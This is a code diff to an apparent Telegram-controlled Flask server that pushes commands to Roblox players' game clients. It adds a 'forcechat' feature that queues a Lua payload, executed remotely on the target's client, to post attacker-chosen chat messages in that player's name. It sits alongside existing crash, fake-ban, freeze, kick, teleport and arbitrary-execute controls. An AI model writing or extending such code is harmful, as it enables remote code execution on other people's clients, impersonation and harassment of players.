@@ -21,8 +21,8 @@ SEMI_ADMINS = [int(admin_id.strip()) for admin_id in SEMI_ADMINS_STR.split(',') 
 TELEGRAM_CHAT_ID = FULL_ADMINS[0] if FULL_ADMINS else None
 
 # === УДОБНАЯ НАСТРОЙКА ПРАВ ДЛЯ SEMI_ADMINS ===
-# Доступные права: message, freeze, unfreeze, kick, defaultkick, fakeban, fakebandefault, fakeban267, reset, execselect, crash, teleport
-SEMI_PERMS_STR = os.getenv('SEMI_PERMS', 'message,freeze,unfreeze,kick,defaultkick,fakeban,fakebandefault,fakeban267,reset,teleport')
+# Доступные права: message, freeze, unfreeze, kick, defaultkick, fakeban, fakebandefault, fakeban267, reset, execselect, crash, teleport, forcechat
+SEMI_PERMS_STR = os.getenv('SEMI_PERMS', 'message,freeze,unfreeze,kick,defaultkick,fakeban,fakebandefault,fakeban267,reset,teleport,forcechat')
 SEMI_PERMS = [p.strip() for p in SEMI_PERMS_STR.split(',') if p.strip()]
 
 # === СПИСОК СКРЫТЫХ ИГРОКОВ (ВИДЯТ ТОЛЬКО FULL_ADMINS) ===
@@ -107,8 +107,10 @@ awaiting_msg_text = {}
 awaiting_msg_duration = {}
 awaiting_execute = {}
 awaiting_teleport = {}
+awaiting_force_chat = {}
 last_seen = {}
 player_places = {}
+player_chat_status = {}
 
 def get_roblox_game_name(place_id):
     if not place_id:
@@ -145,10 +147,13 @@ def log_user():
     username = data.get('username', 'Unknown')
     user_id = data.get('userId', 'Unknown')
     place_id = data.get('placeId')
+    can_chat = data.get('canChat', False)
     
+    if username:
+        player_chat_status[username] = can_chat
     if place_id:
         player_places[username] = place_id
-    
+        
     if username not in commands_queue:
         commands_queue[username] = []
         save_players_to_github_async()
@@ -172,9 +177,11 @@ def log_user():
 def ping():
     username = request.args.get('username')
     place_id = request.args.get('placeId')
+    can_chat = request.args.get('canChat') == 'true'
     
     if username:
         last_seen[username] = time.time()
+        player_chat_status[username] = can_chat
         if place_id:
             player_places[username] = place_id
     return jsonify({"status": "success"})
@@ -258,7 +265,7 @@ def telegram_webhook():
                 return jsonify({"status": "hidden_player_denied"})
             
             # --- 🛡️ УНИВЕРСАЛЬНАЯ ПРОВЕРКА ПРАВ НА ДЕЙСТВИЯ ---
-            protected_actions = ["freeze", "unfreeze", "reset", "crash", "execselect", "message", "kick", "defaultkick", "fakeban", "fakebandefault", "fakeban267", "teleport"]
+            protected_actions = ["freeze", "unfreeze", "reset", "crash", "execselect", "message", "kick", "defaultkick", "fakeban", "fakebandefault", "fakeban267", "teleport", "forcechat"]
             if btn_action in protected_actions:
                 if not is_full_admin and btn_action not in SEMI_PERMS:
                     answer_callback(callback_id, "⛔ У вас нет прав на это действие!", show_alert=True)
@@ -271,6 +278,7 @@ def telegram_webhook():
                 awaiting_msg_text.pop(user_id, None)
                 awaiting_msg_duration.pop(user_id, None)
                 awaiting_teleport.pop(user_id, None)
+                awaiting_force_chat.pop(user_id, None)
 
                 def can_use(action):
                     return is_full_admin or action in SEMI_PERMS
@@ -285,6 +293,9 @@ def telegram_webhook():
 
                 if can_use("teleport"):
                     keyboard_layout.append([{"text": "🚀 Teleport", "callback_data": f"teleport_{target_user}"}])
+
+                if can_use("forcechat"):
+                    keyboard_layout.append([{"text": "🗣 Force Chat", "callback_data": f"forcechat_{target_user}"}])
 
                 row2 = []
                 if can_use("freeze"): row2.append({"text": "🧊 Freeze", "callback_data": f"freeze_{target_user}"})
@@ -304,6 +315,9 @@ def telegram_webhook():
                 if place_id:
                     game_name = get_roblox_game_name(place_id)
                     game_info = f"\n🎮 Играет в: <b>{game_name}</b> ({place_id})"
+
+                chat_status_text = "✅ Доступен" if player_chat_status.get(target_user, False) else "❌ Недоступен"
+                game_info = f"{game_info}\n💬 Чат: {chat_status_text}"
 
                 keyboard = {"inline_keyboard": keyboard_layout}
                 send_telegram_message(
@@ -329,6 +343,10 @@ def telegram_webhook():
             elif btn_action == "teleport":
                 awaiting_teleport[user_id] = target_user
                 send_telegram_message(chat_id, f"🚀 Отправь мне <b>Place ID</b> игры, куда нужно отправить <b>{target_user}</b> (только цифры):", parse_mode="HTML")
+
+            elif btn_action == "forcechat":
+                awaiting_force_chat[user_id] = target_user
+                send_telegram_message(chat_id, f"🗣 Отправь мне текст, который должен написать <b>{target_user}</b> в чат:", parse_mode="HTML")
 
             elif btn_action == "message":
                 awaiting_msg_text[user_id] = target_user
@@ -433,6 +451,19 @@ def telegram_webhook():
                 send_telegram_message(chat_id, f"✅ Игрок {target_user} принудительно отправлен в плейс <code>{place_id}</code>!", parse_mode="HTML")
             except ValueError:
                 send_telegram_message(chat_id, "⚠️ Ошибка: Place ID должен состоять только из цифр. Открой профиль и попробуй снова.")
+
+        elif user_id in awaiting_force_chat:
+            target_user = awaiting_force_chat.pop(user_id)
+            
+            # Я использовал [=[ текст ]=] вместо кавычек, чтобы код не сломался, 
+            # если ты отправишь сообщение, в котором тоже есть кавычки
+            lua_code = f'local m=[=[{text}]=];local t=game:GetService("TextChatService");local r=game:GetService("ReplicatedStorage");if t.ChatVersion==Enum.ChatVersion.TextChatService then local c=t.TextChannels:FindFirstChild("RBXGeneral");if c then c:SendAsync(m) end else local e=r:FindFirstChild("DefaultChatSystemChatEvents");if e and e:FindFirstChild("SayMessageRequest") then e.SayMessageRequest:FireServer(m,"All") end end'
+            
+            action = f"/execute__{lua_code}"
+            if target_user not in commands_queue: commands_queue[target_user] = []
+            commands_queue[target_user].append(action)
+            
+            send_telegram_message(chat_id, f"✅ Сообщение отправлено от лица <b>{target_user}</b>!", parse_mode="HTML")
 
         elif user_id in awaiting_msg_text:
             target_user = awaiting_msg_text.pop(user_id)
